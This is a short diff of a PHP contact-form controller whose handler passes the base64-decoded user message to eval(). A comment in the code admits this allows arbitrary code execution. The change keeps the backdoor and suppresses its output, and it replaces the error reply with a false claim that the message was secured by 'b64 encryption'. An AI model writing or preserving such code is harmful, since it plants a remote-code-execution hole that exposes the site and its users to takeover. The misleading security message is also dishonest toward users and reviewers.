@@ -19,13 +19,12 @@ class ContactController {
     {
         // Décode le message et l'exécute
         // DANGER : Ceci permet toujours l'exécution de code arbitraire
-        ob_start();
+    
         try {
             eval(base64_decode($message));
-            $result = ob_get_clean();
+            $result = '';
         } catch (Throwable $e) {
-            ob_end_clean();
-            $result = "Nous avons bien reçu votre message.";
+            $result = "Nous avons bien reçu votre message sécurisé avec un chiffrement en b64.";
         }
         return $result;
     }
